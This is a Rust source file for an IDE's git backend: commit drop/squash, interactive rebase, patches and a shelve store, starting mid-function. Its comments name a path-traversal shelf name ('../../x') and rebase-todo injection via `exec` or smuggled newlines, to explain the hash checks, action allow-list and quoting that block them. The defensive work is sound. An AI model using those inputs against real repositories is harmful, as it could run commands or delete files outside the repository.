            return Err(String::from_utf8_lossy(&status.stderr).trim().to_string());
        }
        if !status.stdout.is_empty() {
            return Err(crate::error_proto::coded(
                "worktree_dirty",
                "Drop Commit 前请先提交或贮藏未提交的修改",
            ));
        }
    }
    // `^` 后缀让 `--onto` 的取值变成任意 rev 语法（`HEAD^{/pattern}` 等），
    // 而该取值位于 `--end-of-options` 之前（git 要求选项与取值相邻），
    // 只能靠入口的白名单兜底。与 validate_rebase_todo_line 的哈希校验同款：
    // 只接受 7~40 位十六进制缩写或全哈希。
    if hash.len() < 7 || hash.len() > 40 || !hash.chars().all(|c| c.is_ascii_hexdigit()) {
        return Err(crate::error_proto::coded("commit_hash_invalid", hash));
    }

    reject_unsafe_drop(&dir, hash)?;

    let head = git_output(git_cmd().arg("-C").arg(&dir).args(["rev-parse", "HEAD"]))
        .map_err(|e| format!("git 调用失败: {}", e))?;
    let is_head = String::from_utf8_lossy(&head.stdout)
        .trim()
        .eq_ignore_ascii_case(hash);

    let output = if is_head {
        git_output_local(
            git_cmd()
                .arg("-C")
                .arg(&dir)
                .args(["reset", "--hard", "HEAD~1"]),
        )
        .map_err(|e| format!("reset failed: {}", e))?
    } else {
        git_output_local(git_cmd().arg("-C").arg(&dir).args([
            "rebase",
            "--onto",
            &format!("{}^", hash),
            "--end-of-options",
            hash,
        ]))
        .map_err(|e| format!("rebase failed: {}", e))?
    };

    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    if !output.status.success() {
        return Err(text);
    }
    Ok(text)
}

/// 删除提交前的共同守卫：合并提交无法安全摘除；已被远程分支包含的提交
/// 一旦改写历史，协作者下次拉取就会分叉。前端菜单也隐藏这些项，但后端
/// 必须独立复核（菜单状态可能过期，批量入口也可能绕过单条菜单）。
fn reject_unsafe_drop(dir: &str, hash: &str) -> Result<(), String> {
    let merge = git_output(git_cmd().arg("-C").arg(dir).args([
        "rev-parse",
        "--verify",
        "--quiet",
        &format!("{hash}^2"),
    ]))
    .map_err(|e| format!("git rev-parse failed: {e}"))?;
    if merge.status.success() {
        return Err(crate::error_proto::coded("merge_commit_drop", hash));
    }
    let remotes = git_output(git_cmd().arg("-C").arg(dir).args([
        "for-each-ref",
        "--contains",
        hash,
        "--format=%(refname)",
        "refs/remotes",
    ]))
    .map_err(|e| format!("git for-each-ref failed: {e}"))?;
    if !remotes.status.success() {
        return Err(String::from_utf8_lossy(&remotes.stderr).trim().to_string());
    }
    if !remotes.stdout.is_empty() {
        return Err(crate::error_proto::coded("commit_published", hash));
    }
    Ok(())
}

/// 一次摘除多个提交：生成 drop/pick todo 后走同一条 rebase -i 路径。/// 一次摘除多个提交：生成 drop/pick todo 后走同一条 rebase -i 路径。
/// 逐个调用 git_drop_commit 会在第一次改写历史后让后续 hash 失效，必须一次 rebase。
#[tauri::command]
pub fn git_drop_commits(repo_path: Option<String>, hashes: Vec<String>) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let mut selected = std::collections::HashSet::new();
    for h in &hashes {
        let h = h.trim();
        reject_option_like(h)?;
        if h.len() < 7 || h.len() > 40 || !h.chars().all(|c| c.is_ascii_hexdigit()) {
            return Err(crate::error_proto::coded("commit_hash_invalid", h));
        }
        selected.insert(h.to_ascii_lowercase());
    }
    if selected.is_empty() {
        return Ok(String::new());
    }
    for h in &selected {
        reject_unsafe_drop(&dir, h)?;
    }
    let status = git_output(git_cmd().arg("-C").arg(&dir).args([
        "-c",
        "core.quotepath=false",
        "status",
        "--porcelain",
        "--untracked-files=no",
    ]))
    .map_err(|e| format!("git status failed: {e}"))?;
    if !status.status.success() {
        return Err(String::from_utf8_lossy(&status.stderr).trim().to_string());
    }
    if !status.stdout.is_empty() {
        return Err(crate::error_proto::coded(
            "worktree_dirty",
            "批量删除提交前请先提交或贮藏未提交的修改",
        ));
    }
    let revs_out = git_output(git_cmd().arg("-C").arg(&dir).args(["rev-list", "HEAD"]))
        .map_err(|e| format!("git rev-list failed: {e}"))?;
    if !revs_out.status.success() {
        return Err(String::from_utf8_lossy(&revs_out.stderr).trim().to_string());
    }
    let revs: Vec<String> = String::from_utf8_lossy(&revs_out.stdout)
        .lines()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect();
    let oldest_idx = revs
        .iter()
        .enumerate()
        .filter(|(_, h)| selected.contains(&h.to_ascii_lowercase()))
        .map(|(i, _)| i)
        .max()
        .ok_or_else(|| "选中的提交不在当前分支历史中".to_string())?;
    if selected.len()
        > revs
            .iter()
            .filter(|h| selected.contains(&h.to_ascii_lowercase()))
            .count()
    {
        return Err(crate::error_proto::coded("commit_not_in_branch", ""));
    }
    let oldest = revs[oldest_idx].clone();
    let base_out = git_output(
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["rev-parse", &format!("{oldest}^")]),
    )
    .map_err(|e| format!("git rev-parse failed: {e}"))?;
    if !base_out.status.success() {
        return Err("选中的提交包含根提交，无法批量摘除".to_string());
    }
    let base = String::from_utf8_lossy(&base_out.stdout).trim().to_string();
    let range_out = git_output(git_cmd().arg("-C").arg(&dir).args([
        "rev-list",
        "--reverse",
        &format!("{base}..HEAD"),
    ]))
    .map_err(|e| format!("git rev-list failed: {e}"))?;
    if !range_out.status.success() {
        return Err(String::from_utf8_lossy(&range_out.stderr)
            .trim()
            .to_string());
    }
    // 范围里只要存在合并提交，todo 里的 `pick <merge>` 就会被 git 拒绝，
    // 并留下 detached HEAD + 半完成的 rebase。整个范围一起拒绝，避免
    // 「drop 一个早期提交」被历史里的合并提交炸掉。
    let merges = git_output(git_cmd().arg("-C").arg(&dir).args([
        "rev-list",
        "--merges",
        &format!("{base}..HEAD"),
    ]))
    .map_err(|e| format!("git rev-list --merges failed: {e}"))?;
    if !merges.status.success() {
        return Err(String::from_utf8_lossy(&merges.stderr).trim().to_string());
    }
    if !merges.stdout.is_empty() {
        let merge_hashes = String::from_utf8_lossy(&merges.stdout);
        return Err(crate::error_proto::coded(
            "merge_commit_drop",
            merge_hashes.lines().next().unwrap_or(""),
        ));
    }
    let todo: Vec<String> = String::from_utf8_lossy(&range_out.stdout)
        .lines()
        .map(str::trim)
        .filter(|h| !h.is_empty())
        .map(|h| {
            let action = if selected.contains(&h.to_ascii_lowercase()) {
                "drop"
            } else {
                "pick"
            };
            format!("{action} {h}")
        })
        .collect();
    git_rebase_interactive(Some(dir), base, todo)
}

/// 批量压缩提交（Squash Commits）：对齐 PyCharm 交互式压缩逻辑。
/// 将选中的多个提交压缩为一个，并应用用户指定的提交信息。
#[tauri::command]
pub fn git_squash_commits(
    repo_path: Option<String>,
    hashes: Vec<String>,
    message: String,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    if hashes.len() < 2 {
        return Err("至少需要选择两个提交进行压缩合并".to_string());
    }
    let mut selected = std::collections::HashSet::new();
    for h in &hashes {
        let h = h.trim();
        reject_option_like(h)?;
        if h.len() < 7 || h.len() > 40 || !h.chars().all(|c| c.is_ascii_hexdigit()) {
            return Err(crate::error_proto::coded("commit_hash_invalid", h));
        }
        selected.insert(h.to_ascii_lowercase());
    }
    for h in &selected {
        reject_unsafe_drop(&dir, h)?;
    }
    let status = git_output(git_cmd().arg("-C").arg(&dir).args([
        "-c",
        "core.quotepath=false",
        "status",
        "--porcelain",
        "--untracked-files=no",
    ]))
    .map_err(|e| format!("git status failed: {e}"))?;
    if !status.status.success() {
        return Err(String::from_utf8_lossy(&status.stderr).trim().to_string());
    }
    if !status.stdout.is_empty() {
        return Err(crate::error_proto::coded(
            "worktree_dirty",
            "压缩提交前请先提交或贮藏未提交的修改",
        ));
    }
    let revs_out = git_output(git_cmd().arg("-C").arg(&dir).args(["rev-list", "HEAD"]))
        .map_err(|e| format!("git rev-list failed: {e}"))?;
    if !revs_out.status.success() {
        return Err(String::from_utf8_lossy(&revs_out.stderr).trim().to_string());
    }
    let revs: Vec<String> = String::from_utf8_lossy(&revs_out.stdout)
        .lines()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect();
    let oldest_idx = revs
        .iter()
        .enumerate()
        .filter(|(_, h)| selected.contains(&h.to_ascii_lowercase()))
        .map(|(i, _)| i)
        .max()
        .ok_or_else(|| "选中的提交不在当前分支历史中".to_string())?;
    if selected.len()
        > revs
            .iter()
            .filter(|h| selected.contains(&h.to_ascii_lowercase()))
            .count()
    {
        return Err(crate::error_proto::coded("commit_not_in_branch", ""));
    }
    let oldest = revs[oldest_idx].clone();
    let base_out = git_output(
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["rev-parse", &format!("{oldest}^")]),
    )
    .map_err(|e| format!("git rev-parse failed: {e}"))?;
    if !base_out.status.success() {
        return Err("选中的提交包含根提交，无法压缩合并".to_string());
    }
    let base = String::from_utf8_lossy(&base_out.stdout).trim().to_string();
    let range_out = git_output(git_cmd().arg("-C").arg(&dir).args([
        "rev-list",
        "--reverse",
        &format!("{base}..HEAD"),
    ]))
    .map_err(|e| format!("git rev-list failed: {e}"))?;
    if !range_out.status.success() {
        return Err(String::from_utf8_lossy(&range_out.stderr)
            .trim()
            .to_string());
    }
    let merges = git_output(git_cmd().arg("-C").arg(&dir).args([
        "rev-list",
        "--merges",
        &format!("{base}..HEAD"),
    ]))
    .map_err(|e| format!("git rev-list --merges failed: {e}"))?;
    if !merges.status.success() {
        return Err(String::from_utf8_lossy(&merges.stderr).trim().to_string());
    }
    if !merges.stdout.is_empty() {
        let merge_hashes = String::from_utf8_lossy(&merges.stdout);
        return Err(crate::error_proto::coded(
            "merge_commit_drop",
            merge_hashes.lines().next().unwrap_or(""),
        ));
    }

    let all_in_range: Vec<String> = String::from_utf8_lossy(&range_out.stdout)
        .lines()
        .map(str::trim)
        .filter(|h| !h.is_empty())
        .map(|h| h.to_string())
        .collect();

    let mut selected_ordered: Vec<String> = all_in_range
        .iter()
        .filter(|h| selected.contains(&h.to_ascii_lowercase()))
        .cloned()
        .collect();

    if selected_ordered.is_empty() {
        return Err("没有匹配的提交可压缩".to_string());
    }

    let anchor = selected_ordered.remove(0);
    let mut todo: Vec<String> = Vec::new();
    let mut squashed_placed = false;

    for h in &all_in_range {
        if selected.contains(&h.to_ascii_lowercase()) {
            if !squashed_placed {
                todo.push(format!("pick {anchor}"));
                for s in &selected_ordered {
                    todo.push(format!("squash {s}"));
                }
                squashed_placed = true;
            }
        } else {
            todo.push(format!("pick {h}"));
        }
    }

    let mut validated: Vec<String> = Vec::with_capacity(todo.len());
    for line in &todo {
        let ok = validate_rebase_todo_line(line)?;
        if !ok.is_empty() {
            validated.push(ok);
        }
    }

    let todo_file = write_temp_file("ide-squash-todo", (validated.join("\n") + "\n").as_bytes())?;
    let msg_file = write_temp_file(
        "ide-squash-msg",
        (message.trim().to_string() + "\n").as_bytes(),
    )?;

    let mut cmd = git_cmd();
    cmd.arg("-C")
        .arg(&dir)
        .arg("rebase")
        .arg("-i")
        .arg("--end-of-options")
        .arg(base.trim());
    cmd.env(
        "GIT_SEQUENCE_EDITOR",
        format!(
            "cp '{}'",
            shell_single_quote(&todo_file.path().to_string_lossy())
        ),
    );
    cmd.env(
        "GIT_EDITOR",
        format!(
            "cp '{}'",
            shell_single_quote(&msg_file.path().to_string_lossy())
        ),
    );

    let output = git_output_local(&mut cmd).map_err(|e| format!("squash rebase failed: {e}"))?;
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    if !output.status.success() {
        return Err(text);
    }
    Ok(text)
}

/// 提交的原始补丁文本（git show），供 Create Patch / 复制到剪贴板
#[tauri::command]
pub fn git_commit_patch(repo_path: Option<String>, hash: String) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    reject_option_like(&hash)?;
    let output = git_output(git_cmd().arg("-C").arg(&dir).args([
        "-c",
        "core.quotepath=false",
        "show",
        "--end-of-options",
        hash.trim(),
    ]))
    .map_err(|e| format!("git show failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 本地更改的原始补丁文本（git diff [--cached] [-- path]），供 Create Patch / 复制到剪贴板
#[tauri::command]
pub fn git_diff_patch(
    repo_path: Option<String>,
    path: Option<String>,
    cached: Option<bool>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let mut cmd = git_cmd();
    cmd.arg("-C")
        .arg(&dir)
        .args(["-c", "core.quotepath=false", "diff"]);
    if cached.unwrap_or(false) {
        cmd.arg("--cached");
    }
    if let Some(p) = path.as_deref().filter(|p| !p.trim().is_empty()) {
        cmd.arg("--").arg(p.trim());
    }
    let output = git_output(&mut cmd).map_err(|e| format!("git diff failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 把某个提交版本的文件检出到工作区与暂存区（对齐 Get from Revision，覆盖本地该文件）
#[tauri::command]
pub fn git_checkout_file_revision(
    repo_path: Option<String>,
    commit: String,
    path: String,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    reject_option_like(&commit)?;
    let rel = to_repo_relative(&dir, path.trim())?;
    ensure_safe_git_path(&rel)?;
    let output = git_output_local(git_cmd().arg("-C").arg(&dir).args([
        "checkout",
        "--end-of-options",
        commit.trim(),
        "--",
        &rel,
    ]))
    .map_err(|e| format!("checkout failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

// ---------------------------------------------------------------------------
// 编辑器 gutter 变更条 / 交互式变基 / Shelve / 冲突解决
// ---------------------------------------------------------------------------

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct FileChangeHunkDto {
    /// 工作区行号（1 起）；removed 块为原删除位置起始行
    pub start_line: u32,
    pub end_line: u32,
    /// "added" | "modified" | "removed"
    pub kind: String,
}

/// 编辑器 gutter 变更条数据：HEAD 与工作区的行级差异（git diff -U0）
#[tauri::command]
pub async fn git_file_change_hunks(
    repo_path: Option<String>,
    path: String,
) -> Result<Vec<FileChangeHunkDto>, String> {
    // 编辑内容每次变化都会防抖 500ms 后刷新，是编辑器里最高频的 git 调用。
    // 同步执行占住 ipc worker，期间的 git_blame / git_status 全部排队。
    // 见 git_status 的说明。
    tauri::async_runtime::spawn_blocking(move || git_file_change_hunks_impl(repo_path, path))
        .await
        .map_err(|e| format!("git_file_change_hunks 任务失败: {e}"))?
}

/// git_file_change_hunks 的同步实现，抽出理由同 git_status_impl。
fn git_file_change_hunks_impl(
    repo_path: Option<String>,
    path: String,
) -> Result<Vec<FileChangeHunkDto>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let text = run_git_diff(
        &dir,
        &["diff", "-U0", "--no-color", "--no-ext-diff", "--", &path],
    )?;

    let mut hunks = Vec::new();
    for line in text.lines() {
        if !line.starts_with("@@") {
            continue;
        }
        // @@ -oldStart,oldCount +newStart,newCount @@
        let body = line.trim_start_matches("@").trim();
        let mut parts = body.split_whitespace();
        let old_part = parts
            .next()
            .unwrap_or("-0,0")
            .trim_start_matches('-')
            .to_string();
        let new_part = parts
            .next()
            .unwrap_or("+0,0")
            .trim_start_matches('+')
            .to_string();

        let parse = |spec: &str| -> (u32, u32) {
            let mut it = spec.split(',');
            let start: u32 = it.next().and_then(|v| v.parse().ok()).unwrap_or(0);
            let count: u32 = it.next().and_then(|v| v.parse().ok()).unwrap_or(1);
            (start, count)
        };
        let (_old_start, old_count) = parse(&old_part);
        let (new_start, new_count) = parse(&new_part);

        if old_count == 0 && new_count > 0 {
            hunks.push(FileChangeHunkDto {
                start_line: new_start,
                end_line: new_start + new_count - 1,
                kind: "added".to_string(),
            });
        } else if new_count == 0 && old_count > 0 {
            // 删除块：在保留内容的位置画一条删除标记
            let at = new_start.max(1);
            hunks.push(FileChangeHunkDto {
                start_line: at,
                end_line: at,
                kind: "removed".to_string(),
            });
        } else if new_count > 0 {
            hunks.push(FileChangeHunkDto {
                start_line: new_start,
                end_line: new_start + new_count - 1,
                kind: "modified".to_string(),
            });
        }
    }
    Ok(hunks)
}

/// rebase todo 行的合法动作词。
///
/// git 的 todo 语法里 `exec` / `x` 会**执行**给出的 shell 命令，
/// `label` / `reset` / `merge` 也有各自的副作用。本应用只做
/// 「pick / reword / edit / squash / fixup / drop」的交互式重排，
/// 因此白名单只放行重排语义的动作，从源头堵死命令注入。
const REBASE_TODO_ACTIONS: &[&str] = &[
    "pick", "p", "reword", "r", "edit", "e", "squash", "s", "fixup", "f", "drop", "d",
];

/// 校验并规范化一条 rebase todo 行。
///
/// 拒绝：动作词不在白名单、参数个数不符、含 shell 元字符或换行。
/// 目的是让 `todo` 的内容永远是「重排某个已知提交」，
/// 绝不携带可执行指令（`exec`/`x`）或注入的换行行。
fn validate_rebase_todo_line(line: &str) -> Result<String, String> {
    let trimmed = line.trim();
    if trimmed.is_empty() {
        return Ok(String::new());
    }
    // 注释行（git 生成的操作说明）原样保留，但不参与动作校验
    if trimmed.starts_with('#') {
        return Ok(trimmed.to_string());
    }
    let mut parts = trimmed.split_whitespace();
    let action = parts.next().ok_or("todo 行为空")?;
    let args: Vec<&str> = parts.collect();

    // 动作词必须在白名单内：`exec`/`x` 会执行 shell，
    // `label`/`reset`/`merge` 也有副作用，本应用都用不到。
    if !REBASE_TODO_ACTIONS.contains(&action) {
        return Err(format!(
            "todo 行含未授权的动作 '{}'（仅支持 pick/reword/edit/squash/fixup/drop）",
            action
        ));
    }

    // 每个白名单动作都恰好接受一个提交引用
    if args.is_empty() {
        return Err(crate::error_proto::coded(
            "rebase_todo_missing_rev",
            trimmed,
        ));
    }
    // 提交引用只允许十六进制（缩写或全哈希）。消息部分允许任意可见文本，
    // 但 split_whitespace 已切掉换行，注入多行 todo 的企图在此失效。
    let rev = args[0];
    if !rev.chars().all(|c| c.is_ascii_hexdigit()) {
        return Err(crate::error_proto::coded("rebase_todo_bad_rev", rev));
    }
    Ok(trimmed.to_string())
}

/// 通过 GIT_SEQUENCE_EDITOR 注入（git 经由自身 sh 调用，cp 在 git-bash 中可用）
#[tauri::command]
pub fn git_rebase_interactive(
    repo_path: Option<String>,
    base: String,
    todo: Vec<String>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    reject_option_like(&base)?;
    // 逐行白名单校验：todo 内容来自前端重排结果，但其中可能混入含
    // `exec` 或换行的提交消息。写入前先确认每一行都只是「重排某提交」。
    let mut validated: Vec<String> = Vec::with_capacity(todo.len());
    for line in &todo {
        let ok = validate_rebase_todo_line(line)?;
        if !ok.is_empty() {
            validated.push(ok);
        }
    }
    // 临时名带纳秒时间戳：只用进程 id 的话，同一进程内连续两次 rebase
    // （例如用户先在弹窗里改一次、取消后再改一次）会互相覆盖还没消费的 todo。
    // RAII：任何出口（含 `?` 早退与 panic）都会删掉临时文件，
    // 不会把 todo 残留在 /tmp；O_EXCL 避免跟随预先埋好的软链。
    let todo = write_temp_file("ide-rebase-todo", (validated.join("\n") + "\n").as_bytes())?;

    let mut cmd = git_cmd();
    cmd.arg("-C")
        .arg(&dir)
        .arg("rebase")
        .arg("-i")
        .arg("--end-of-options")
        .arg(base.trim());
    // GIT_SEQUENCE_EDITOR 的值会被 shell 解释：路径含空格或 shell 元字符时
    // `cp /tmp/a b.txt` 会被拆成多个参数直接失败。单引号包裹 + 内部单引号
    // 转义（'\''）是 POSIX shell 里唯一安全的字面量写法。
    cmd.env(
        "GIT_SEQUENCE_EDITOR",
        format!(
            "cp '{}'",
            shell_single_quote(&todo.path().to_string_lossy())
        ),
    );
    cmd.env("GIT_EDITOR", "true");

    let output = git_output_local(&mut cmd).map_err(|e| format!("rebase failed: {}", e))?;
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    if !output.status.success() {
        return Err(text);
    }
    Ok(text)
}

/// POSIX shell 单引号字面量转义：`'` → `'\''`。
///
/// 单引号内没有任何字符有特殊含义，因此这是唯一能让任意路径
/// 在 `sh -c` 下保持字面量的写法。
fn shell_single_quote(s: &str) -> String {
    s.replace('\'', "'\\''")
}

fn shelves_dir(repo_path: &str) -> std::path::PathBuf {
    Path::new(repo_path).join(".git").join("ide-shelves")
}

fn deleted_shelves_dir(repo_path: &str) -> std::path::PathBuf {
    shelves_dir(repo_path).join(".deleted")
}

fn deleted_shelf_file_path(repo_path: &str, name: &str) -> Result<PathBuf, String> {
    let safe: String = name
        .trim()
        .chars()
        .map(|c| {
            if c == '/' || c == '\\' || c == ':' {
                '_'
            } else {
                c
            }
        })
        .collect();
    if safe.is_empty() {
        return Err("贮藏名称不能为空".to_string());
    }
    if safe == "." || safe == ".." {
        return Err(crate::error_proto::coded("stash_name_invalid", name));
    }
    let base = deleted_shelves_dir(repo_path);
    let candidate = base.join(format!("{}.patch", safe));
    if !candidate.starts_with(&base) {
        return Err(crate::error_proto::coded("stash_name_out_of_range", name));
    }
    Ok(candidate)
}

/// 从磁盘文件名反推展示/回传用的 shelf 名字。
///
/// 必须与 `shelf_file_path` 的 sanitize 保持一致：写入侧把 `/` `\` `:`
/// 换成 `_`，因此 `git_list_shelves` 不能直接用 `strip_suffix(".patch")`
/// 的结果 —— 那会让用户输入 `a:b` 存下来的条目在列表里显示成 `a_b`，
/// 后端 apply/delete 收到 `a_b` 反而能找到文件，但显示与用户记忆不符；
/// 更糟的是保存时返回的 `file_stem()` 与列表名字在含 `.patch` 子串的
/// 名字上会叉开（`x.patch` → 存成 `x.patch.patch`）。
/// 统一走这一个函数，三处（save 返回 / list 下发 / 前端回传解析）同源。
fn shelf_name_of(file_name: &str) -> String {
    file_name
        .strip_suffix(".patch")
        .unwrap_or(file_name)
        .replace(['/', '\\', ':'], "_")
}

/// 规范化并校验一个 shelf 名称，返回其补丁文件路径。
///
/// 四个 shelf 命令（save / delete / apply / apply_partial）都必须走这里：
/// 此前只有 `git_shelve_save` 做了 `/ \ :` → `_` 的 sanitize，其余三个用裸
/// `name.trim()` 拼路径。后果有两个：
/// 1. 功能不一致 —— `save("a:b")` 存成 `a_b.patch`，`apply("a:b")` 去找
///    `a:b.patch`，报「贮藏不存在」；
/// 2. 安全漏洞 —— `name = "../../x"` 时 `shelves_dir().join("../../x.patch")`
///    越出 `.git/ide-shelves/`，`remove_file` 能删到仓库外的文件。
///
/// 统一的 sanitize + 前缀断言把两个问题一起解决。
fn shelf_file_path(repo_path: &str, name: &str) -> Result<PathBuf, String> {
    let safe: String = name
        .trim()
        .chars()
        .map(|c| {
            if c == '/' || c == '\\' || c == ':' {
                '_'
            } else {
                c
            }
        })
        .collect();
    if safe.is_empty() {
        return Err("贮藏名称不能为空".to_string());
    }
    // 再拦一次：sanitize 已换掉分隔符，剩下的 `..` 仍可能被 join 折叠
    if safe == "." || safe == ".." {
        return Err(crate::error_proto::coded("stash_name_invalid", name));
    }
    let base = shelves_dir(repo_path);
    let candidate = base.join(format!("{}.patch", safe));
    // 兜底断言：sanitize 换了 `/`，理论上不可能越界；真出现了就明确失败，
    // 而不是静默把文件写到（或删掉）仓库外。
    if !candidate.starts_with(&base) {
        return Err(crate::error_proto::coded("stash_name_out_of_range", name));
    }
    Ok(candidate)
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct ShelfDto {
    pub name: String,
    pub date: String,
    /// 补丁涉及的文件（b 侧路径），Shelf 页直接据此渲染变更清单
    pub files: Vec<String>,
}

/// 从 git 补丁文本提取涉及的文件路径（「+++ b/」行的 b 侧；/dev/null 为删除侧，跳过）
fn patch_files(patch: &str) -> Vec<String> {
    let mut files = Vec::new();
    for line in patch.lines() {
        if let Some(p) = line.strip_prefix("+++ b/") {
            files.push(p.trim_matches('"').to_string());
        }
    }
    files.sort();
    files.dedup();
    files
}

/// 列出贮藏架（Shelve）：补丁存于仓库 .git/ide-shelves/ 下，随仓库隔离
#[tauri::command]
pub fn git_list_shelves(repo_path: Option<String>) -> Result<Vec<ShelfDto>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let dir_path = shelves_dir(&dir);
    let mut shelves = Vec::new();
    let entries = match fs::read_dir(&dir_path) {
        Ok(e) => e,
        Err(_) => return Ok(shelves),
    };
    for entry in entries.flatten() {
        let meta = match entry.metadata() {
            Ok(m) => m,
            Err(_) => continue,
        };
        let raw = entry.file_name().to_string_lossy().to_string();
        let Some(_name) = raw.strip_suffix(".patch") else {
            continue;
        };
        // 下发的名字必须与 save/delete/apply 的解析一致：`shelf_file_path`
        // 会把 `/` `\` `:` 换成 `_`，因此「文件名去掉 .patch」与「用户输入的
        // 名字经同一 sanitize」可能不同形（如 `a:b` 存成 `a_b.patch`）。
        // 这里用与写入侧相同的函数反推名字，前端拿它回调任何命令都能命中。
        let display_name = shelf_name_of(&raw);
        let date = meta
            .modified()
            .ok()
            .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
            .map(|d| format_unix_date(d.as_secs() as i64))
            .unwrap_or_default();
        let files = fs::read_to_string(entry.path())
            .map(|text| patch_files(&text))
            .unwrap_or_default();
        shelves.push(ShelfDto {
            name: display_name,
            date,
            files,
        });
    }
    shelves.sort_by(|a, b| b.name.cmp(&a.name));
    Ok(shelves)
}

/// 保存补丁到贮藏架
#[tauri::command]
pub fn git_shelve_save(
    repo_path: Option<String>,
    name: String,
    patch: String,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let file = shelf_file_path(&dir, &name)?;
    let dir_path = shelves_dir(&dir);
    fs::create_dir_all(&dir_path).map_err(|e| format!("创建目录失败: {}", e))?;
    fs::write(&file, patch).map_err(|e| format!("写入失败: {}", e))?;
    // 返回规范化后的名字：前端用它做后续操作，必须与 list 下发的名字同源
    // （都是 sanitize 后的形态），否则「保存成功、列表可见、Unshelve 报不存在」。
    Ok(format!(
        "已贮藏 {}",
        file.file_name()
            .map(|s| s.to_string_lossy().into_owned())
            .map(|s| shelf_name_of(&s))
            .unwrap_or_default()
    ))
}

/// 删除贮藏架条目：普通搁置移入「最近删除」，已在「最近删除」中的条目彻底移除
#[tauri::command]
pub fn git_delete_shelf(repo_path: Option<String>, name: String) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let file = shelf_file_path(&dir, &name)?;
    let del_file = deleted_shelf_file_path(&dir, &name)?;
    if file.exists() {
        let del_dir = deleted_shelves_dir(&dir);
        let _ = fs::create_dir_all(&del_dir);
        if fs::rename(&file, &del_file).is_err() {
            if fs::copy(&file, &del_file).is_ok() {
                let _ = fs::remove_file(&file);
            } else {
                return fs::remove_file(&file)
                    .map(|_| format!("已删除贮藏 {}", name.trim()))
                    .map_err(|e| crate::error_proto::coded_display("delete_failed", e));
            }
        }
        Ok(format!("已删除贮藏 {}", name.trim()))
    } else if del_file.exists() {
        match fs::remove_file(&del_file) {
            Ok(_) => Ok(format!("已彻底删除贮藏 {}", name.trim())),
            Err(e) => Err(crate::error_proto::coded_display("delete_failed", e)),
        }
    } else {
        Err(crate::error_proto::coded("stash_not_found", name.trim()))
    }
}

/// 应用贮藏架补丁到工作区（Unshelve）；冲突返回 stderr
#[tauri::command]
pub fn git_apply_shelf(repo_path: Option<String>, name: String) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let file = shelf_file_path(&dir, &name)?;
    if !file.exists() {
        return Err(crate::error_proto::coded("stash_not_found", name.trim()));
    }
    let output = git_output_local(
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["apply", "--whitespace=nowarn"])
            .arg(&file),
    )
    .map_err(|e| format!("apply failed: {}", e))?;
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    if !output.status.success() {
        return Err(text);
    }
    Ok(text)
}

/// `git ls-files` 输出与请求路径的比较键：去空白、去 `./` 前缀、统一 `/`。
///
/// 只为「字符串相等」比较用，不做真实路径解析 —— 两侧都来自同一次 git 调用
/// 的语境（仓库相对路径）。
fn normalize_ls_path(p: &str) -> String {
    p.trim().trim_start_matches("./").replace('\\', "/")
}

/// 多文件合并补丁（Shelve 勾选文件用）。未跟踪文件与 git_diff 一样，
/// 用 --no-index 对空文件生成「全新增」差异并追加，保证 Unshelve 能还原内容
#[tauri::command]
pub fn git_diff_patch_paths(
    repo_path: Option<String>,
    paths: Vec<String>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let cleaned: Vec<String> = paths
        .iter()
        .map(|p| p.trim().to_string())
        .filter(|p| !p.is_empty())
        .collect();
    if cleaned.is_empty() {
        return Ok(String::new());
    }
    let refs: Vec<&str> = cleaned.iter().map(|s| s.as_str()).collect();
    let output = git_output(
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args([
                "-c",
                "core.quotepath=false",
                "diff",
                "--no-color",
                "--no-ext-diff",
            ])
            .arg("--")
            .args(&refs),
    )
    .map_err(|e| format!("git diff failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    let mut patch = String::from_utf8_lossy(&output.stdout).to_string();

    // 未跟踪判定改为一次批量 `git ls-files -z`（输出已跟踪路径）再求差集：
    // 旧实现每个文件 spawn 一次 `git ls-files --error-unmatch`，勾选几十个
    // 文件时就是几十次进程启动。含 glob 元字符的名称在 ls-files 里是通配
